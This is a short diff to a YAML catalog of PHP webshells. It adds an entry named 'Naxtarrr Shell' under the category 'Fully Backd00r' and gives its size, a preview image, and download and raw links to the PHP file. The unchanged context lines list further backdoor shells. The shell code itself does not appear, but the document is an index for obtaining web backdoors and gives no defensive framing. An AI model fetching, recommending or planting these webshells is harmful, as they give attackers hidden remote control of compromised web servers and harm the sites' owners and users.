@@ -234,6 +234,15 @@
   raw: "https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/me/ayanami.php"
 
 - category: "Fully Backd00r"
+  name: "Naxtarrr Shell"
+  image: "https://adilhyz.github.io/webshell/preview/NAX.webp"
+  size: "38kb"
+  version: "-"
+  password: "-"
+  download: "https://adilhyz.github.io/webshell/PHP/naxc.php"
+  raw: "https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/naxc.php"
+
+- category: "Fully Backd00r"
   name: "VoidGate Shell"
   image: "https://adilhyz.github.io/webshell/preview/void.webp"
   size: "30kb"
